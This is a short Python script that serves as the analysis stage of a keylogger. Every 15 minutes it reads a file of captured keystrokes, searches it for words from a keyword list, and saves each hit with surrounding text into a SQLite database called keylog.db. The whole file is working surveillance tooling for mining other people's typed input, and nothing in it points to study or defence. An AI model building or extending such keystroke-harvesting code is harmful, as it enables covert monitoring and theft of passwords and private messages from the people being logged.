import time
import sqlite3

KEYWORDS_FILE = "keywords.txt"          # File containing keywords, one per line
KEYSTROKE_LOG_FILE = "logs/key.txt"     # File with captured keystrokes
DB_FILE = "keylog.db"                    # Changed database file name

def load_keywords():
    with open(KEYWORDS_FILE, "r", encoding="utf-8") as f:
        return set(line.strip().lower() for line in f if line.strip())

def check_and_log_matches(keywords):
    with open(KEYSTROKE_LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read().lower()

    matched_words = [word for word in keywords if word in content]

    if matched_words:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keyword_alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                matched_word TEXT,
                snippet TEXT
            )
        """)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        records = []
        for word in matched_words:
            index = content.find(word)
            start = max(index - 30, 0)
            end = min(index + len(word) + 30, len(content))
            snippet = content[start:end].replace("\n", " ").strip()
            records.append((timestamp, word, snippet))

        cursor.executemany(
            "INSERT INTO keyword_alerts (timestamp, matched_word, snippet) VALUES (?, ?, ?)",
            records
        )
        conn.commit()
        conn.close()
        print(f"[{timestamp}] Logged {len(matched_words)} matched keywords.")
    else:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] No keywords matched.")

if __name__ == "__main__":
    keywords = load_keywords()
    print(f"Loaded {len(keywords)} keywords for detection.")

    while True:
        check_and_log_matches(keywords)
        time.sleep(15 * 60)
